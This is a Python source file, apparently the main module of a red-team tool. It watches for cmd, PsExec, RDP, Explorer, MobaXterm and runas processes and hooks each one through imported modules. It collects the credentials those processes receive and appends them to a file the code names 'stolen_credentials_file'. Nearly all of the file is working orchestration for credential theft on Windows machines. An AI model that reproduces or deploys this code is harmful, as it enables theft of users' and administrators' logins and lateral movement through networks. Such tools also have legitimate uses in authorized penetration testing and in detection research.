# Author: Ilan Kalendarov, Twitter: @IKalendarov
# Contributors: NirLevy98, LXTreato
# License: BSD 3-Clause


from __future__ import print_function
from multiprocessing.pool import ThreadPool
from typing import List
from time import sleep
import psutil
import re


def get_process_by_list_names(name_list: List[str]) -> List[psutil.Process]:
    process_list = list()
    for p in psutil.process_iter(attrs=["name", "exe", "cmdline"]):
        if p.info['name'] in name_list:
            process_list.append(p)
    return process_list


def get_all_process_pids():
    process_pids = []
    for process in psutil.process_iter():
        process_id = process.pid
        process_pids.append(process_id)
    return process_pids


def get_process_by_name(name: str) -> List[psutil.Process]:
    return get_process_by_list_names([name])


def run_thread_pool_for_functions(functions: list):
    pool = ThreadPool(len(functions))
    for function in functions:
        pool.apply_async(function)
    pool.close()
    pool.join()


def wait_for_process(process_name, tag_name, hook_function):
    running_pids = []

    while True:
        processes_alive = get_process_by_list_names(process_name)
        for process in processes_alive:
            if process.pid not in running_pids:
                running_pids.append(process.pid)
                print(f"[+] Found {tag_name} Window")
                hook_function(process.pid)
            else:
                for pid in running_pids:
                    if pid not in get_all_process_pids():
                        running_pids.remove(pid)
                        print(f"[-] {pid} is dead")
        sleep(0.5)


def on_credential_submit(message, data):
    print(f"[+] Got message from hooked process:")
    print(message)
    if message['type'] == "send":
        credential_dump = message["payload"]
        hooked_program = \
        re.search(r"Intercepted Creds from (?P<hooked_program>[A-z]*)", credential_dump).groups("hooked_program")[0]

        print(f"[+] Parsed credentials submitted to {hooked_program} prompt:")
        print(credential_dump)
        with open("credentials.txt", "a") as stolen_credentials_file:
            stolen_credentials_file.write(credential_dump + '\n')


def main():
    from hooks import rdp, psexec, explorer, cmd, mobaxterm, runas

    functions = [cmd.wait_for, psexec.wait_for, rdp.wait_for, explorer.wait_for, mobaxterm.wait_for, runas.wait_for]
    run_thread_pool_for_functions(functions)


if __name__ == "__main__":
    main()
